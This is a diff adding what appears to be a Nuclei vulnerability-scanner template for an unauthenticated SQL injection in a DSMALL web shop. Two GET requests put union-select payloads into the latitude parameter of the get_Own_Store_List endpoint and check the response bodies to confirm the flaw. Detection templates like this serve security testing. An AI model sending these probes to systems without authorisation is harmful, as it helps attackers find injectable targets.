@@ -1,0 +1,45 @@
+id: poc-yaml-dsmall-unauth-sql-injection
+info:
+  name: DSAMLL Unauthenticated SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /index.php/home/Shopnearby/get_Own_Store_List?latitude=(select+1+union+select+1)&longitude=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "goods_id"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /index.php/home/Shopnearby/get_Own_Store_List?latitude=(select+1+union+select+2)&longitude=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "goods_id"
+      - type: status
+        status:
+          - 200
+
+    stop-at-first-match: true
